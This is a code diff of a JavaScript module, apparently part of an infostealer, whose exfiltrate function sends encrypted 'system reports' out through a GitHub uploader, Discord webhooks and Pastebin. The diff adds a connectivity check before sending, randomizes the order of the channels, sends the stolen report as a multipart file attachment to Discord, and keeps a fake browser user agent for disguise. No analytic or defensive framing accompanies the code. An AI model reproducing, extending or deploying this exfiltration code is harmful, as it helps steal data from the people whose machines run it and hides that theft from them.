@@ -6,19 +6,62 @@ const config = require("./config");
 const { uploadToGitHub } = require("./uploader");
 
 const FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
+const CONNECTIVITY_URLS = [
+    "https://github.com",
+    "https://google.com",
+    "https://api.github.com"
+];
 
-/**
- * Try each exfil channel in order. Returns true if any succeeds.
- * @param {object} report
- * @param {string} systemId
- * @returns {Promise<boolean>}
- */
+async function checkConnectivity() {
+    for (const url of CONNECTIVITY_URLS) {
+        try {
+            const response = await fetch(url, {
+                method: "HEAD",
+                signal: AbortSignal.timeout(5000)
+            });
+            if (response.ok || response.status < 500) return true;
+        } catch {
+            continue;
+        }
+    }
+    return false;
+}
+
+function shuffle(arr) {
+    for (let i = arr.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [arr[i], arr[j]] = [arr[j], arr[i]];
+    }
+    return arr;
+}
+
+function buildMultipart(boundary, payloadJson, fileName, fileContent) {
+    const encoder = new TextEncoder();
+    const parts = [
+        encoder.encode(`--${boundary}\r\n`),
+        encoder.encode(`Content-Disposition: form-data; name="payload_json"\r\n\r\n`),
+        encoder.encode(payloadJson),
+        encoder.encode(`\r\n--${boundary}\r\n`),
+        encoder.encode(`Content-Disposition: form-data; name="file"; filename="${fileName}"\r\n`),
+        encoder.encode(`Content-Type: application/json\r\n\r\n`),
+        encoder.encode(fileContent),
+        encoder.encode(`\r\n--${boundary}--\r\n`)
+    ];
+    return Buffer.concat(parts);
+}
+
 async function exfiltrate(report, systemId) {
-    const channels = [
+    const online = await checkConnectivity();
+    if (!online) {
+        logger.warn("No connectivity detected, skipping exfil");
+        return false;
+    }
+
+    const channels = shuffle([
         { name: "github", fn: () => uploadToGitHub(report, systemId) },
         { name: "discord", fn: () => uploadToDiscord(report, systemId) },
         { name: "pastebin", fn: () => uploadToPastebin(report, systemId) }
-    ];
+    ]);
 
     for (const { name, fn } of channels) {
         try {
@@ -36,12 +79,6 @@ async function exfiltrate(report, systemId) {
     return false;
 }
 
-/**
- * Upload encrypted report via Discord webhook.
- * @param {object} report
- * @param {string} systemId
- * @returns {Promise<boolean>}
- */
 async function uploadToDiscord(report, systemId) {
     const { webhook } = config.discord;
     if (!webhook) return false;
@@ -49,31 +86,42 @@ async function uploadToDiscord(report, systemId) {
     const guid = getMachineGuid();
     const plaintext = JSON.stringify(report, null, 2);
     const encrypted = encryptAes(plaintext, guid);
+    const encryptedStr = JSON.stringify(encrypted, null, 2);
 
     return withRetry(async ({ signal }) => {
+        const boundary = `----${Date.now().toString(36)}`;
+        const payloadJson = JSON.stringify({
+            content: `System Report — ${systemId}`,
+            embeds: [{
+                title: "System Report",
+                description: `Encrypted report for ${systemId}`,
+                fields: [
+                    { name: "System ID", value: systemId, inline: true },
+                    { name: "Timestamp", value: report.timestamp || "N/A", inline: true }
+                ]
+            }]
+        });
+
+        const body = buildMultipart(
+            boundary,
+            payloadJson,
+            `report-${systemId}.json`,
+            encryptedStr
+        );
+
         const response = await fetch(webhook, {
             method: "POST",
             headers: {
-                "Content-Type": "application/json",
+                "Content-Type": `multipart/form-data; boundary=${boundary}`,
                 "User-Agent": FAKE_UA
             },
-            body: JSON.stringify({
-                content: `\`\`\`json\n${systemId}\n\`\`\``,
-                embeds: [{
-                    title: "System Report",
-                    description: `Report for ${systemId}`,
-                    fields: [
-                        { name: "System ID", value: systemId, inline: true },
-                        { name: "Timestamp", value: report.timestamp || "N/A", inline: true }
-                    ]
-                }]
-            }),
+            body,
             signal
         });
 
         if (!response.ok) {
-            const body = await response.text().catch(() => "");
-            throw new Error(`Discord API ${response.status}: ${body.slice(0, 200)}`);
+            const text = await response.text().catch(() => "");
+            throw new Error(`Discord API ${response.status}: ${text.slice(0, 200)}`);
         }
 
         logger.info("Report uploaded via Discord");
@@ -81,12 +129,6 @@ async function uploadToDiscord(report, systemId) {
     }, { label: "Discord" });
 }
 
-/**
- * Upload encrypted report as a Pastebin paste.
- * @param {object} report
- * @param {string} systemId
- * @returns {Promise<boolean>}
- */
 async function uploadToPastebin(report, systemId) {
     const { apiKey } = config.pastebin;
     if (!apiKey) return false;
